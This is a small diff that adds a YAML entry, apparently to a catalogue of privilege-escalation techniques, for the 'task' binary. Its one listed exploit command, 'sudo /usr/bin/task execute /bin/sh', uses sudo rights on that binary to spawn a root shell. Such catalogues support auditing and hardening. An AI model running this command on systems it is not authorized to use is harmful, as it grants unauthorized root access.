@@ -1,0 +1,4 @@
+name: task
+binary_path: /usr/bin/task
+exploit_cmds:
+- sudo /usr/bin/task execute /bin/sh
